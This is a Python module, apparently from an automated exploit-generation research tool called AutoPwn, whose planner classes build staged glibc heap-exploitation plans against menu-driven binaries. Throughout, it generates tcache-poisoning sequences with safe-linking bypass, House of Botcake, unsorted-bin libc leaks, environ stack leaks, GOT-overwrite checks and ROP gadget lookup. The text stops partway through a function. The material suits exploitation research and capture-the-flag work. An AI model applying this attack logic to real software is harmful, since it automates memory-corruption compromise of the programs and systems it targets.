"""
Module 6: Evolutionary Planner (Rewritten — matches Paper Algorithm 2)

Implements the exploit generation algorithm from the AutoPwn paper.

Also contains SmartPlanner — a dynamic technique-driven planner that
dispatches to specialized stage builders or falls back to a generic
sequence generator using parsed how2heap C sources.
"""

import json
import os
import sys
import argparse
import re
from typing import List, Dict, Optional, Any, Set, Tuple
from pwn import ELF, ROP, context

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from knowledge_base.loader import get_knowledge_base

context.log_level = 'error'


class EvolutionaryPlanner:
    """Implements Algorithm 2 from the AutoPwn paper."""

    def __init__(self, esm_data: dict, critical_vars: dict,
                 binary_path: str = None, symbolic_results: dict = None):
        if isinstance(esm_data, dict):
            self.esm_states = esm_data.get("esm_states", [])
            self.chunk_table = esm_data.get("chunk_table", {})
            self.leak_info = esm_data.get("leak_info", [])
            self.action_catalog = esm_data.get("action_catalog", [])
            self.state_transitions = esm_data.get("state_transitions", [])
        else:
            self.esm_states = esm_data if isinstance(esm_data, list) else []
            self.chunk_table = {}
            self.leak_info = []
            self.action_catalog = []
            self.state_transitions = []

        self.esm_latest = self.esm_states[-1]["state_after"] if self.esm_states else {}
        self.critical_vars = critical_vars
        self.symbolic_results = symbolic_results or {}
        self.observed_sizes = self._extract_sizes()
        self.heap_layout = self._extract_heap_layout()

        self.kb = get_knowledge_base()

        self.libc = None
        self.libc_path = None
        if binary_path:
            self._load_libc(binary_path)

        self.current_state: Optional[dict] = None
        self.visited_states: Set[str] = set()

    def _load_libc(self, binary_path: str):
        try:
            exe = ELF(binary_path, checksec=False)
            if exe.libc:
                self.libc = exe.libc
                self.libc_path = exe.libc.path
        except Exception:
            binary_dir = os.path.dirname(os.path.abspath(binary_path))
            for candidate in ["libc.so.6", "libc.so"]:
                libc_path = os.path.join(binary_dir, candidate)
                if os.path.exists(libc_path):
                    self.libc = ELF(libc_path, checksec=False)
                    self.libc_path = libc_path
                    break

    def _extract_sizes(self) -> List[int]:
        sizes = set()
        for entry in self.esm_states:
            ev = entry.get("event", {})
            if ev.get("type") == "Alloc":
                sz = ev.get("size", 0)
                if sz:
                    sizes.add(sz)
        return sorted(list(sizes)) if sizes else [0x30]

    def _extract_heap_layout(self) -> Dict[str, Any]:
        layout = {
            "first_chunk_offset": 0x2a0,
            "chunks": {},
            "max_alloc_addr": 0,
            "heap_base": None,
        }
        for addr_hex, info in self.chunk_table.items():
            addr = int(addr_hex, 16)
            offset = addr & 0xfff
            size = info["size"]
            tag = None
            for entry in self.esm_states:
                ev = entry.get("event", {})
                if ev.get("type") == "Alloc" and ev.get("addr") == addr_hex:
                    tag = f"chunk_{len(layout['chunks'])}"
                    break
            layout["chunks"][addr_hex] = {
                "addr": addr, "offset": offset, "size": size,
                "status": info["status"],
                "tag": tag or f"chunk_{len(layout['chunks'])}",
            }
            if addr > layout["max_alloc_addr"]:
                layout["max_alloc_addr"] = addr
            if layout["heap_base"] is None:
                layout["heap_base"] = addr - offset
        if layout["chunks"]:
            addrs = sorted(layout["chunks"].values(), key=lambda c: c["addr"])
            layout["first_chunk"] = addrs[0]
            layout["first_chunk_offset"] = addrs[0]["offset"]
            layout["heap_base"] = addrs[0]["addr"] - addrs[0]["offset"]
        return layout

    @staticmethod
    def state_eq(s1: dict, s2: dict) -> bool:
        for cat in ["bugs", "primitives", "techniques", "capabilities", "goals"]:
            d1 = s1.get(cat, {})
            d2 = s2.get(cat, {})
            detected1 = {k for k, v in d1.items() if v.get("state") == "detected"}
            detected2 = {k for k, v in d2.items() if v.get("state") == "detected"}
            if detected1 != detected2:
                return False
        return True

    def action_query(self, state: dict) -> List[dict]:
        actions = []
        detected_caps = {k for k, v in state.get("capabilities", {}).items()
                        if v.get("state") == "detected"}
        detected_prims = {k for k, v in state.get("primitives", {}).items()
                         if v.get("state") == "detected"}
        detected_techs = {k for k, v in state.get("techniques", {}).items()
                         if v.get("state") == "detected"}
        all_detected = detected_caps | detected_prims | detected_techs

        exploit_ir = self.critical_vars.get("composite_exploit_ir",
                                             self.critical_vars.get("exploit_ir", {}))
        transitions = exploit_ir.get("transitions", [])
        for t in transitions:
            from_key = t["from"]
            if from_key in all_detected:
                actions.append({
                    "action": t["action"],
                    "target_state": t["to"],
                    "confidence": t.get("confidence", 0.5),
                    "from": from_key,
                })
        verified_techs = self.symbolic_results.get("summary", {}).get("verified_techniques", [])
        for a in actions:
            for vt in verified_techs:
                if vt.lower() in a["action"].lower() or vt.lower() in a["target_state"].lower():
                    a["confidence"] += 0.5
        actions.sort(key=lambda a: a["confidence"], reverse=True)
        return actions

    def apply_action(self, current_state: dict, action: dict) -> dict:
        new_state = dict(current_state)
        target = action.get("target_state", "")
        if target:
            if target in ("libc_leak", "stack_leak"):
                if "capabilities" not in new_state:
                    new_state["capabilities"] = {}
                new_state["capabilities"][target] = {"state": "detected"}
            elif target in ("arbitrary_allocation", "arbitrary_write"):
                if "primitives" not in new_state:
                    new_state["primitives"] = {}
                new_state["primitives"][target] = {"state": "detected"}
            elif target in ("control_flow_hijack",):
                if "goals" not in new_state:
                    new_state["goals"] = {}
                new_state["goals"][target] = {"state": "detected"}
            elif target in ("tcache_poisoning", "unsortedbin_leak", "chunk_overlap"):
                if "techniques" not in new_state:
                    new_state["techniques"] = {}
                new_state["techniques"][target] = {"state": "detected"}
        return new_state

    def dfs_explore(self, si: dict, actions_list: List[dict]) -> Optional[List[dict]]:
        if self._is_final_state(si):
            return actions_list
        candidate_actions = self.action_query(si)
        if not candidate_actions:
            return None
        for action in candidate_actions:
            sj = self.apply_action(si, action)
            expected_state = self._get_expected_state(si, action)
            if self.state_eq(sj, expected_state):
                result = self.dfs_explore(sj, actions_list + [action])
                if result is not None:
                    return result
        return None

    def _is_final_state(self, state: dict) -> bool:
        goals = state.get("goals", {})
        return any(v.get("state") == "detected" for v in goals.values())

    def _get_expected_state(self, si: dict, action: dict) -> dict:
        target = action.get("target_state", "")
        expected = dict(si)
        if target in ("libc_leak", "stack_leak"):
            if "capabilities" not in expected:
                expected["capabilities"] = {}
            expected["capabilities"][target] = {"state": "detected"}
        elif target in ("arbitrary_allocation", "arbitrary_write"):
            if "primitives" not in expected:
                expected["primitives"] = {}
            expected["primitives"][target] = {"state": "detected"}
        elif target in ("control_flow_hijack",):
            if "goals" not in expected:
                expected["goals"] = {}
            expected["goals"][target] = {"state": "detected"}
        elif target in ("tcache_poisoning", "unsortedbin_leak", "chunk_overlap"):
            if "techniques" not in expected:
                expected["techniques"] = {}
            expected["techniques"][target] = {"state": "detected"}
        return expected

    def _generate_ir_from_actions(self, actions: List[dict]) -> List[dict]:
        main_size = 0x30
        if self.observed_sizes:
            main_size = self.observed_sizes[-1]
        if main_size > 0x400:
            main_size = min(main_size, 0x200)

        ir_stages = []
        detected_caps = set()
        for entry in self.esm_states:
            state = entry.get("state_after", {})
            for cat in ["capabilities", "primitives", "techniques", "goals"]:
                for k, v in state.get(cat, {}).items():
                    if v.get("state") == "detected":
                        detected_caps.add(k)

        stage1_ir = [
            {"op": "ALLOC", "tag": "chunk0", "size": main_size, "data": "b'A'*0x30"},
            {"op": "ALLOC", "tag": "chunk1", "size": main_size, "data": "b'B'*0x30"},
            {"op": "FREE", "tag": "chunk0"},
            {"op": "READ_VAL", "tag": "chunk0", "save_as": "xor_key",
             "offset": 0, "note": "read_first_8_bytes_fd_xor"},
            {"op": "CALC", "var": "heap_base", "expr": "xor_key << 12"},
        ]
        ir_stages.append({
            "name": "leak_heap_xor", "requires": ["uaf"],
            "produces": {"heap_base": {"trust": 0.95}},
            "trust": 0.95, "ir": stage1_ir,
        })

        if "libc_leak" in detected_caps or "unsortedbin_leak" in detected_caps:
            stage2_ir = [
                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
                {"op": "FREE", "tag": "chunk0"},
                {"op": "POISON_FD", "tag": "chunk0",
                 "pos": "heap_base + 0x0", "target": "heap_base + 0x2d0"},
                {"op": "ALLOC", "tag": "dummy1", "size": main_size},
                {"op": "ALLOC", "tag": "overwrite_size", "size": main_size,
                 "data": "p64(0) + p64(0x421)"},
                {"op": "FREE", "tag": "chunk0"},
                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
                {"op": "FREE", "tag": "chunk0"},
                {"op": "POISON_FD", "tag": "chunk0",
                 "pos": "heap_base + 0x0", "target": "heap_base + 0x6f0"},
                {"op": "ALLOC", "tag": "dummy2", "size": main_size},
                {"op": "ALLOC", "tag": "fake_chunks", "size": main_size,
                 "data": "p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)"},
                {"op": "FREE", "tag": "chunk1"},
                {"op": "READ_VAL", "tag": "chunk1", "save_as": "libc_leak",
                 "offset": 0, "note": "read_first_8_bytes_fd_xor"},
            ]
            libc_calc_expr = "libc_leak - LIBC_AUTO_OFFSET"
            if self.libc:
                sym_offset = None
                for name in ["main_arena", "__malloc_hook", "__free_hook"]:
                    if name in self.libc.symbols:
                        sym_offset = self.libc.symbols[name]
                        break
                if sym_offset is not None:
                    libc_calc_expr = f"libc_leak - {hex(sym_offset + 96)}"
            stage2_ir.append({"op": "CALC", "var": "libc.address",
                             "expr": libc_calc_expr, "note": "AUTO"})
            ir_stages.append({
                "name": "leak_libc_fake_unsorted",
                "requires": ["heap_base", "uaf", "double_free"],
                "produces": {"libc_leak": {"trust": 0.9}},
                "trust": 0.9, "ir": stage2_ir,
            })

        if "stack_leak" in detected_caps or "environ_leak" in detected_caps:
            stage3_ir = [
                {"op": "FREE", "tag": "chunk0"},
                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
                {"op": "FREE", "tag": "chunk0"},
                {"op": "POISON_FD", "tag": "chunk0",
                 "pos": "heap_base + 0x0",
                 "target": "libc.symbols['__environ'] - 0x18"},
                {"op": "ALLOC", "tag": "dummy3", "size": main_size},
                {"op": "ALLOC", "tag": "environ_chunk", "size": main_size,
                 "data": "b'A'*0x18"},
                {"op": "READ_VAL", "tag": "environ_chunk",
                 "save_as": "stack_leak", "offset": 0,
                 "note": "skip_A_0x18_then_read_6_bytes"},
            ]
            ir_stages.append({
                "name": "leak_stack_environ",
                "requires": ["libc_leak", "uaf", "double_free"],
                "produces": {"stack_leak": {"trust": 0.9}},
                "trust": 0.9, "ir": stage3_ir,
            })

        if "control_flow_hijack" in detected_caps or "rop_chain" in detected_caps:
            stage4_ir = [
                {"op": "FREE", "tag": "chunk0"},
                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
                {"op": "FREE", "tag": "chunk0"},
                {"op": "POISON_FD", "tag": "chunk0",
                 "pos": "heap_base + 0x0",
                 "target": "stack_leak - offset_to_control_flow"},
                {"op": "ALLOC", "tag": "dummy4", "size": main_size},
                {"op": "ALLOC_ROP", "tag": "rop_payload", "size": main_size},
            ]
            ir_stages.append({
                "name": "rop_return_address",
                "requires": ["stack_leak", "uaf", "double_free"],
                "produces": {"control_flow_hijack": {"method": "ROP"}},
                "trust": 0.95, "ir": stage4_ir,
            })

        return ir_stages

    def validate_plan(self, plan: Dict) -> List[Dict]:
        issues = []
        for stage in plan.get("path", []):
            for instr in stage.get("ir", []):
                op = instr.get("op", "")
                data = instr.get("data", "")
                if op == "ALLOC" and "0x421" in str(data):
                    actual_size = 0x420
                    is_valid, reason = self.kb.validate_fake_chunk_size(actual_size, "unsorted_bin")
                    if not is_valid:
                        issues.append({
                            "stage": stage["name"], "instruction": instr,
                            "issue": reason, "severity": "ERROR"
                        })
                    else:
                        issues.append({
                            "stage": stage["name"], "instruction": instr,
                            "issue": f"Knowledge validation: {reason}", "severity": "INFO"
                        })
        free_actions = []
        for stage in plan.get("path", []):
            for instr in stage.get("ir", []):
                if instr.get("op") in ("FREE", "ALLOC"):
                    free_actions.append(instr)
        is_valid, seq_issues = self.kb.validate_free_sequence(free_actions)
        issues.extend(seq_issues)
        return issues

    def _compute_forged_size(self) -> int:
        tcache_bins = 64
        max_tcache_size = tcache_bins * 0x10
        forged = max_tcache_size + 0x20 + 1
        return forged

    def _compute_poison_target(self) -> int:
        if self.heap_layout.get("chunks"):
            chunks = sorted(self.heap_layout["chunks"].values(), key=lambda c: c["addr"])
            first_chunk = chunks[0]
            main_size = self.observed_sizes[-1] if self.observed_sizes else 0x30
            return first_chunk["addr"] + main_size
        return 0x2d0

    def build_plan(self) -> Dict:
        initial_state = self.esm_states[0]["state_after"] if self.esm_states else {}
        self.current_state = initial_state
        action_sequence = self.dfs_explore(initial_state, [])
        if action_sequence:
            print(f"[+] DFS found exploit path with {len(action_sequence)} actions")
            ir_stages = self._generate_ir_from_actions(action_sequence)
        else:
            print("[-] DFS failed to find complete path, falling back to detected capabilities")
            ir_stages = self._generate_ir_from_actions([])
        plan = {"trust": 0.9, "path": ir_stages}
        issues = self.validate_plan(plan)
        if issues:
            error_count = sum(1 for i in issues if i.get("severity") == "ERROR")
            info_count = sum(1 for i in issues if i.get("severity") == "INFO")
            print(f"[!] Knowledge validation: {error_count} errors, {info_count} info")
            for issue in issues:
                print(f"    [{issue.get('severity', 'UNKNOWN')}] {issue.get('issue', '')}")
            plan["validation_issues"] = issues
        return plan

    def print_strategy(self, plan: Dict):
        print("\n" + "=" * 60)
        print(f"  [STRATEGY] Overall Trust: {plan['trust']}")
        print("=" * 60)
        for i, stage in enumerate(plan.get("path", []), 1):
            print(f" STAGE {i}: {stage['name']} (Trust: {stage['trust']})")
            print(f"   -> Produces: {', '.join(stage['produces'].keys())}")
            for instr in stage.get("ir", []):
                op = instr["op"]
                tag = instr.get("tag", "")
                details = [f"{k}={v}" for k, v in instr.items() if k not in ["op", "tag"]]
                detail_str = f" ({', '.join(details)})" if details else ""
                print(f"      - {op:<20} {tag:<15} {detail_str}")
            print("-" * 60)

    def save_plan(self, plan: Dict, output_file: str):
        with open(output_file, "w") as f:
            json.dump(plan, f, indent=4)
        print(f"[OK] Precise DSL plan saved to {output_file}")


# ─────────────────────────────────────────────────────────────────────
# SmartPlanner — Dynamic KB-driven planner
# ─────────────────────────────────────────────────────────────────────

class SmartPlanner:
    def __init__(self, interface_map: dict, libc_path: str = None,
                 ld_path: str = None, binary_path: str = None,
                 esm_hints: dict = None):
        self.interface_map = interface_map
        self.libc_elf = None
        self.libc_path = libc_path
        self.ld_path = ld_path
        self.binary_path = binary_path
        self.esm_hints = esm_hints or {}

        if libc_path and os.path.exists(libc_path):
            try:
                self.libc_elf = ELF(libc_path, checksec=False)
            except Exception:
                pass

        self.ops = interface_map.get("operations", {})
        self.features = interface_map.get("features", {})
        self.menu_prompt = interface_map.get("menu_prompt", "b'> '")

        self.libc_offsets = {}
        self.one_gadgets = []
        self.pop_rdi = None
        self.ret = None

        self._find_roles()
        self._detect_libc_offsets()
        self.index_reuse = self._detect_index_reuse()
        self._detect_got_overwrite_feasibility()

        self.glibc_version = self._detect_glibc_version()
        self.has_safe_linking = self._detect_safe_linking()
        self.has_hooks = self._detect_hooks()
        self.binary_security = self._detect_binary_security()

        self._technique_matcher = None

    def set_esm_hints(self, hints: dict):
        self.esm_hints = hints

    def _get_technique_matcher(self):
        if self._technique_matcher is None:
            from core.technique_matcher import TechniqueMatcher
            self._technique_matcher = TechniqueMatcher(
                glibc_version=self.glibc_version,
                binary_security=self.binary_security,
                libc_offsets=self.libc_offsets,
                interface_map=self.interface_map,
                esm_hints=self.esm_hints
            )
        return self._technique_matcher

    def _find_roles(self):
        self.alloc_choice = None
        self.free_choice = None
        self.view_choice = None
        self.edit_choice = None
        self.exit_choice = "0"
        for choice, info in self.ops.items():
            role = info.get("role")
            if role == "alloc":
                self.alloc_choice = choice
            elif role == "free":
                self.free_choice = choice
            elif role == "view":
                self.view_choice = choice
            elif role == "edit":
                self.edit_choice = choice
        self.exit_choice = self._detect_exit_choice()

    def _detect_exit_choice(self) -> str:
        if not self.binary_path or not os.path.exists(self.binary_path):
            return "0"
        try:
            from elftools.elf.elffile import ELFFile
            with open(self.binary_path, 'rb') as f:
                elf = ELFFile(f)
                for section in elf.iter_sections():
                    if section.name == '.rodata':
                        rodata = section.data()
                        for b in b'0123456789':
                            # Match "5. exit", "5) quit", "5 - leave", "5: Quit" etc.
                            for keyword in [b'exit', b'quit', b'leave', b'depart']:
                                pattern = f'({chr(b)})[\\.\\)\\]\\-:>]\\s*'.encode() + keyword
                                if re.search(pattern, rodata, re.IGNORECASE):
                                    return chr(b)
        except Exception:
            pass
        # Fallback: use the interface_map candidate that was classified as "non-heap"
        if hasattr(self, 'ops') and self.ops:
            for choice, info in self.ops.items():
                if info.get('role') == 'non-heap':
                    return choice
        return "0"

    @staticmethod
    def _scan_main_arena(libc_elf):
        malloc_addr = libc_elf.symbols.get('__libc_malloc', 0)
        if not malloc_addr:
            return None
        try:
            data = libc_elf.read(malloc_addr, 0x600)
        except Exception:
            return None
        for i in range(len(data) - 7):
            if data[i:i+3] == b'\x48\x8d\x1d':
                off = int.from_bytes(data[i+3:i+7], 'little', signed=True)
                target = malloc_addr + i + 7 + off
                if 0x100000 < target < 0x400000:
                    return target
        return None

    def _detect_libc_offsets(self):
        self.libc_offsets = {}
        if not self.libc_elf:
            return
        for name in ['system', '__free_hook', '__malloc_hook',
                      '__environ', '_IO_2_1_stdout_']:
            try:
                self.libc_offsets[name] = self.libc_elf.symbols.get(name, 0)
            except Exception:
                pass
        main_arena = SmartPlanner._scan_main_arena(self.libc_elf)
        if main_arena:
            self.libc_offsets['main_arena'] = main_arena
        else:
            mh = self.libc_elf.symbols.get('__malloc_hook', 0)
            if mh:
                self.libc_offsets['main_arena'] = mh + 0x10
        self.one_gadgets = []
        for sym_name in list(self.libc_elf.symbols.keys()):
            if 'one_gadget' in sym_name.lower():
                self.one_gadgets.append(self.libc_elf.symbols[sym_name])
        self.pop_rdi = None
        self.ret = None
        try:
            rop = ROP(self.libc_elf)
            g = rop.find_gadget(['pop rdi', 'ret'])
            if g:
                self.pop_rdi = g[0]
            g = rop.find_gadget(['ret'])
            if g:
                self.ret = g[0]
        except Exception:
            pass

    def _get_alloc_params(self):
        if not self.alloc_choice:
            return []
        return self.ops.get(self.alloc_choice, {}).get("steps", [])

    def _needs_size_param(self):
        steps = self._get_alloc_params()
        return any(s.get("arg") == "size" for s in steps)

    def _needs_idx_param(self):
        steps = self._get_alloc_params()
        if any(s.get("arg") == "idx" for s in steps):
            return True
        for choice in [self.free_choice, self.view_choice, self.edit_choice]:
            if choice and choice in self.ops:
                op_steps = self.ops[choice].get("steps", [])
                if any(s.get("arg") == "idx" for s in op_steps):
                    return True
        return False

    def _get_data_param_index(self):
        steps = self._get_alloc_params()
        for i, s in enumerate(steps):
            if s.get("arg") == "data":
                return i
        return None

    def _align_size(self, user_size):
        if user_size is None:
            return 0x40
        header = 0x10 if user_size > 0x10 else 0x20
        return ((user_size + header + 0xF) // 0x10) * 0x10

    def compute_heap_layout(self, actions):
        offset = 0x290
        offsets = {}
        for a in actions:
            tag = a["tag"]
            sz = self._align_size(a["size"])
            offsets[tag] = offset
            offset += sz
        return offsets

    def get_first_user_data_offset(self):
        return 0x290

    def _detect_index_reuse(self):
        return False

    def _detect_got_overwrite_feasibility(self):
        self.got_overwrite = False
        self.got_free_addr = None
        self.binary_ret_addr = None
        if not self.binary_path or not os.path.exists(self.binary_path):
            return
        try:
            elf = ELF(self.binary_path, checksec=False)
            cs = elf.checksec()
            if cs.get('relro') == 'Partial' and not cs.get('pie'):
                if elf.got.get('free'):
                    self.got_free_addr = hex(elf.got['free'])
                    self.got_overwrite = True
                for sym in ['__libc_csu_init', 'main']:
                    if sym in elf.symbols:
                        ret_val = elf.symbols[sym]
                        if elf.read(ret_val, 1) == b'\xc3':
                            self.binary_ret_addr = hex(ret_val)
                            break
                else:
                    for seg in elf.segments:
                        if seg.header.p_flags & 1:
                            for addr in range(seg.header.p_vaddr, seg.header.p_vaddr + seg.header.p_memsz):
                                try:
                                    if elf.read(addr, 1) == b'\xc3':
                                        self.binary_ret_addr = hex(addr)
                                        break
                                except Exception:
                                    pass
        except Exception:
            pass

    def _detect_glibc_version(self) -> str:
        if not self.libc_elf:
            return None
        ver = None
        try:
            with open(self.libc_path, 'rb') as f:
                raw = f.read()
            for m in re.finditer(rb'GNU C Library[^)]*\)[^0-9]*([0-9]+\.[0-9]+)', raw):
                ver = m.group(1).decode()
                break
        except Exception:
            pass
        if ver:
            return ver
        free_hook_val = self.libc_elf.symbols.get('__free_hook', None)
        malloc_hook_val = self.libc_elf.symbols.get('__malloc_hook', None)
        has_hooks = (free_hook_val is not None and free_hook_val != 0) or \
                    (malloc_hook_val is not None and malloc_hook_val != 0)
        has_tcache_sym = any('tcache' in s.lower() for s in self.libc_elf.symbols)
        if has_hooks:
            return "2.29" if has_tcache_sym else "2.23"
        return "2.39"

    def _detect_safe_linking(self) -> bool:
        if not self.libc_elf:
            return False
        ver = self.glibc_version
        if ver:
            try:
                major, minor = ver.split('.')[:2]
                return int(minor) >= 32
            except (ValueError, IndexError):
                pass
        return True

    def _detect_hooks(self) -> bool:
        if not self.libc_elf:
            return False
        free_hook_val = self.libc_elf.symbols.get('__free_hook', None)
        malloc_hook_val = self.libc_elf.symbols.get('__malloc_hook', None)
        return (free_hook_val is not None and free_hook_val != 0) or \
               (malloc_hook_val is not None and malloc_hook_val != 0)

    def _detect_binary_security(self) -> dict:
        sec = {"relro": "Full", "pie": False, "nx": True, "canary": False, "cet": False}
        if not self.binary_path or not os.path.exists(self.binary_path):
            return sec
        try:
            elf = ELF(self.binary_path, checksec=False)
            cs = elf.checksec()
            if isinstance(cs, dict):
                sec.update(cs)
        except Exception:
            pass
        return sec

    def _bins_offset(self):
        return 0x60

    # ─── Dynamic Dispatch ─────────────────────────────────────────────

    def _detect_max_slots(self) -> int:
        """Detect the maximum number of allocatable slots from the binary."""
        if not self.binary_path or not os.path.exists(self.binary_path):
            return 10  # Default fallback
        try:
            with open(self.binary_path, 'rb') as f:
                data = f.read()
            # Look for patterns like "(0-4)" or " (0-9)" or "[0-15]"
            for m in re.finditer(rb'\(0[-\s](\d+)\)|\[0[-\s](\d+)\]', data):
                matches = m.groups()
                max_n_str = next(m for m in matches if m is not None)
                return int(max_n_str) + 1
        except Exception:
            pass
        # Fallback to interface_map if fuzzer found anything
        for choice, info in self.ops.items():
            if info.get('role') == 'alloc':
                for step in info.get('steps', []):
                    if step.get('arg') == 'idx':
                        prompt = str(step.get('prompt', '')).lower()
                        m = re.search(r'0-(\d+)', prompt)
                        if m:
                            return int(m.group(1)) + 1
        return 10

    def _detect_alloc_size(self) -> int:
        """Detect the allocation size if it's fixed."""
        if not self.binary_path or not os.path.exists(self.binary_path):
            return 0x30
        
        # Check if alloc takes a size parameter
        if self._needs_size_param():
            return 0x30 # Variable size, use 0x30 as base
            
        # Try to find common fixed sizes in binary strings
        try:
            with open(self.binary_path, 'rb') as f:
                data = f.read()
            # Heuristic: look for malloc(constant) patterns? No, hard in stripped binaries.
            # Look for prompts like "data (max 128 bytes)"
            for m in re.finditer(rb'max\s+(\d+)\s+bytes', data, re.I):
                return int(m.group(1))
        except Exception:
            pass
            
        return 0x30

    def _build_house_of_botcake_stages(self):
        """
        House of Botcake for libc leak + tcache poisoning with safe-linking bypass.
        Optimized for 5-10 index slots.
        """
        max_slots = self._detect_max_slots()
        main_size = self._detect_alloc_size()
        alloc_sz = self._align_size(main_size)
        stages = []

        # Stage 1: Fill tcache + unsorted bin leak + xor_key leak
        stage1_ir = []
        
        # For Botcake we need 7 fillers + A + B + guard = 10 chunks.
        # If slots < 10, we must reuse indices.
        # But wait, we can just use more tags, and let codegen map them to indices.
        # However, codegen currently maps each tag to a NEW index.
        # So we should reuse tags here.
        
        filler_count = min(7, max(1, max_slots - 3))
        for i in range(filler_count):
            stage1_ir.append({
                "op": "ALLOC", "tag": f"f{i}", "size": main_size,
                "data_expr": f"b'F' * {main_size}"
            })
        
        stage1_ir.append({"op": "ALLOC", "tag": "A", "size": main_size, "data_expr": "b'A' * 8"})
        stage1_ir.append({"op": "ALLOC", "tag": "B", "size": main_size, "data_expr": "b'B' * 8"})
        stage1_ir.append({"op": "ALLOC", "tag": "guard", "size": main_size, "data_expr": "b'G' * 8"})
        
        for i in range(filler_count):
            stage1_ir.append({"op": "FREE", "tag": f"f{i}"})
            
        if self.view_choice is not None:
            stage1_ir.append({
                "op": "VIEW", "tag": "f0", "save_as": "xor_key",
                "note": "read_first_8_bytes"
            })
            
        stage1_ir.append({"op": "FREE", "tag": "A"})
        stage1_ir.append({"op": "FREE", "tag": "B"})
        
        if self.view_choice is not None:
            stage1_ir.append({
                "op": "VIEW", "tag": "A", "save_as": "libc_leak",
                "note": "read_first_8_bytes"
            })
            
        stage1_ir.append({"op": "CALC", "var": "_environ_offset", "expr": "libc.symbols['environ']"})
        libc_expr = "libc_leak - LIBC_AUTO_OFFSET"
        if hasattr(self, 'libc_offsets') and self.libc_offsets.get("main_arena"):
            ma_off = self.libc_offsets["main_arena"]
            bins_off = self._bins_offset()
            libc_expr = f"libc_leak - {hex(ma_off + bins_off)}"
        stage1_ir.append({"op": "CALC", "var": "libc.address", "expr": libc_expr})
        stage1_ir.append({"op": "CALC", "var": "heap_base", "expr": "xor_key << 12"})
        stages.append({"name": "leak_libc_botcake", "ir": stage1_ir})

        # Stage 2: Stack leak via tcache poison
        stage2_ir = []
        # Reuse filler slots to empty tcache
        for i in range(min(6, filler_count)):
            stage2_ir.append({"op": "ALLOC", "tag": f"f{i}", "size": main_size, "data_expr": "b'P' * 8"})
            
        stage2_ir.append({
            "op": "CALC", "var": "_environ_target",
            "expr": "libc.address + _environ_offset - 0x18"
        })
        stage2_ir.append({"op": "FREE", "tag": "guard"})
        
        # We need the address of 'guard'.
        # Assuming layout is f0..fn, A, B, guard.
        guard_idx = filler_count + 2
        guard_addr = f"heap_base + {hex(0x290 + guard_idx * alloc_sz)}"
        
        if self.has_safe_linking:
            fd_expr = f"p64(_environ_target ^ (({guard_addr}) >> 12))"
        else:
            fd_expr = "p64(_environ_target)"
        
        if self.edit_choice is not None:
            stage2_ir.append({"op": "EDIT", "tag": "guard", "data_expr": fd_expr})
            
        # Re-alloc fillers if needed to reach env_chunk
        stage2_ir.append({"op": "ALLOC", "tag": "fill_e", "size": main_size, "data_expr": "b'Q' * 8"})
        stage2_ir.append({"op": "ALLOC", "tag": "env_chunk", "size": main_size, "data_expr": "b'Z'"})
        
        if self.view_choice is not None:
            stage2_ir.append({
                "op": "VIEW", "tag": "env_chunk",
                "save_as": "stack_leak", "note": "skip_first_8"
            })
            
        stage2_ir.append({
            "op": "CALC", "var": "main_ret_addr", "expr": "stack_leak - 0x130"
        })
        stages.append({"name": "leak_stack", "ir": stage2_ir})

        # Stage 3: ROP
        stage3_ir = []
        stage3_ir.append({"op": "ALLOC", "tag": "r1", "size": main_size, "data_expr": "b'R' * 8"})
        stage3_ir.append({"op": "FREE", "tag": "r1"})
        
        # r1 address
        r1_addr = f"heap_base + {hex(0x290)}" # f0 reused as r1
        
        if self.has_safe_linking:
            rop_fd = f"p64((main_ret_addr - 8) ^ (({r1_addr}) >> 12))"
        else:
            rop_fd = "p64(main_ret_addr - 8)"
        if self.edit_choice is not None:
            stage3_ir.append({
                "op": "EDIT", "tag": "r1", "data_expr": rop_fd
            })
        stage3_ir.append({
            "op": "ALLOC", "tag": "r0", "size": main_size,
            "data_expr": "b'Y' * 8"
        })
        stage3_ir.append({
            "op": "ALLOC_ROP", "tag": "r1", "size": main_size
        })
        stages.append({"name": "rop_chain", "ir": stage3_ir})

        meta = {
            "strategy": "tcache_poison_stack",
            "has_safe_linking": self.has_safe_linking,
            "has_hooks": self.has_hooks,
            "glibc_version": self.glibc_version or "2.39",
            "allocated_size": hex(alloc_sz),
        }
        return {"stages": stages, "meta": meta}

    def _build_tcache_poison_stack_stages(self):
        max_slots = self._detect_max_slots()
        var_size = self._needs_size_param()

        if var_size:
            main_size_stage1 = 0xB0
            main_size_stage3 = 0x30
            filler_count = 7
        else:
            main_size_stage1 = self._detect_alloc_size()
            main_size_stage3 = main_size_stage1

        alloc_sz1 = self._align_size(main_size_stage1)
        alloc_sz3 = self._align_size(main_size_stage3)

        stages = []

        stage1_ir = []

        if var_size:
            for i in range(7):
                stage1_ir.append({"op": "ALLOC", "tag": f"f{i}", "size": main_size_stage1, "data_expr": f"b'F' * {main_size_stage1}"})
            stage1_ir.append({"op": "ALLOC", "tag": "ov", "size": main_size_stage1, "data_expr": "b'O' * 8"})
            stage1_ir.append({"op": "ALLOC", "tag": "guard", "size": main_size_stage1, "data_expr": "b'G' * 8"})
            for i in range(7):
                stage1_ir.append({"op": "FREE", "tag": f"f{i}"})
            stage1_ir.append({"op": "FREE", "tag": "ov"})
        else:
            for i in range(8):
                stage1_ir.append({"op": "ALLOC", "tag": f"c{i}", "idx": i, "size": main_size_stage1, "data_expr": "b'X' * 8"})
            stage1_ir.append({"op": "EDIT", "tag": "c2", "idx": 2, "data_expr": "p64(0) + p64(0xC1)"})
            stage1_ir.append({"op": "EDIT", "tag": "c5", "idx": 5, "data_expr": "p64(0) + p64(0x41)"})
            stage1_ir.append({"op": "EDIT", "tag": "c6", "idx": 6, "data_expr": "p64(0) + p64(0x21)"})
            for i in range(2):
                stage1_ir.append({"op": "FREE", "tag": f"c{i}", "idx": i})

        if self.view_choice is not None:
            if var_size:
                stage1_ir.append({"op": "VIEW", "tag": "ov", "save_as": "libc_leak", "note": "read_first_8_bytes"})
                stage1_ir.append({"op": "VIEW", "tag": "f0", "save_as": "xor_key", "note": "read_first_8_bytes_fd_xor"})
            else:
                stage1_ir.append({"op": "VIEW", "tag": "c0", "idx": 0, "save_as": "xor_key", "note": "read_first_8_bytes_fd_xor"})
